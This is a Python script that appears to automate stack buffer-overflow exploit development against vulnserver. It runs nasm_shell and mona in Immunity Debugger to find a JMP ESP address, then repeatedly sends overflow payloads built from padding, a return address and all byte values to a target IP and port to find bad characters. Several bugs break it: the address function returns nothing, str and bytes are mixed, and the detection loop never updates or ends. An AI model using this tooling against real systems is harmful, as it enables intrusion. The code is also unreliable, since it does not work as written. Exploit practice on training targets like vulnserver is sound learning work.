#!/usr/bin/env python3
import sys
import socket
import argparse
import subprocess
import re
from color_print import print_success, print_error, print_info

def get_command_suffix(command):
    COMMAND_SUFFIX = {
        "DEFAULT":"",
        "TRUN":"/.:/",
        "GMON":"/",
        "KSTET":".",
        "GDOG":"/..."
    }
    cmd_upper = command.upper()
    return COMMAND_SUFFIX.get(cmd_upper, COMMAND_SUFFIX["DEFAULT"])

def get_esp_bytes():
    try:
        process = subprocess.Popen(
            ["/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb"],
            stdin = subprocess.PIPE,
            stdout = subprocess.PIPE,
            stderr = subprocess.PIPE,
            text = True    
            )
        process.stdin.write("jmp esp\n")
        process.stdin.close()
        output, error = process.communicate()

        if error:
            print_error(f"nasm_shell error: {error}")
            return bytes.fromhex("FFE4")
        
        match = re.search(r"([0-9A-F]{8})\s+([0-9A-F]+)", output)
        if match:
            hex_bytes = match.group(2)
            return bytes.fromhex(hex_bytes)
        else:
            print_error(f"Failed to parse output.")
            return bytes.fromhex("FFE4")
    except Exception as e:
        print_error(f"Error: {e}")
        sys.exit(1)


def run_mona_jump_esp(Immunity_PATH, vulnserver_PATH, module, esp_machine_code):
    try:
        Immunity_cmd = [
            f"{Immunity_PATH}",
            f"{vulnserver_PATH}",
            "-c", f"!mona find -s \"{esp_machine_code}\" -m {module}.dll"
        ]

        


        print_info("Launching Immunity Debugger with command: " + " ".join(Immunity_cmd))
        subprocess.run(Immunity_cmd)
    except Exception as e:
        print_error(f"Failed to launch Immunity Debugger: {e}")
        sys.exit(1)

def badchars_detection(ip, port, jmp_esp, offset, full_command):
    badchars = [0x00]
    iteration = 1

    while True:
        print_info(f"Badchars detection iteration {iteration}")
        all_chars = bytes([b for b in range(1,256) if b not in badchars])
        print_info(f"Current badchars: {badchars}")

        try:
            payload = full_command + b"A" * offset + bytes.fromhex(jmp_esp)[::-1] + all_chars                         
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(payload)
            try:
                s.settimeout(5)
                response = s.recv(1024)
                print_info(f"Received response: {response[:100]}...")
            except socket.timeout:
                print_info("No response received.")
            finally:
                s.close()
                print_success(f"Payload sent successfully.")
        except Exception as e:
            print_error(f"Error: {e}")
            return badchars

def main():
    parser = argparse.ArgumentParser(description="Full Controller Tool. FullController v1.0")
    parser.add_argument("-ip", type=str, help="The target IP address.", required=True)
    parser.add_argument("-port", type=int, help="The target port.", required=True)
    parser.add_argument("-offset", type=int, help="The offset value.", required=True)
    parser.add_argument("-imPATH", type=str, help="Path to Immunity Debugger.(Absolute PATH)", required=True)
    parser.add_argument("-vulnPATH", type=str, help="Path to the vulnserver.exe.(Absolute PATH)", required=True)
    parser.add_argument("-module", type=str , help="The module name (e.g. essfunc)", required=True )
    parser.add_argument("-cmd", type=str, help="Input defective commands.(e.g. TRUN)", required=True)
    args = parser.parse_args()

    ip = args.ip
    port = args.port
    offset = args.offset
    Immunity_PATH = args.imPATH
    vulnserver_PATH = args.vulnPATH
    module = args.module
    command = args.cmd
    suffix = get_command_suffix(command)
    full_command = command + suffix

    esp_machine_code  = get_esp_bytes()
    print_info(f"JMP ESP machine code: {esp_machine_code.hex()}")

    jmp_esp = run_mona_jump_esp(Immunity_PATH, vulnserver_PATH, module, esp_machine_code)
    if not jmp_esp:
        sys.exit(1)

    badchars = badchars_detection(ip, port, jmp_esp, offset, full_command)

    print_info(f"")



if __name__ == "__main__":
    main()
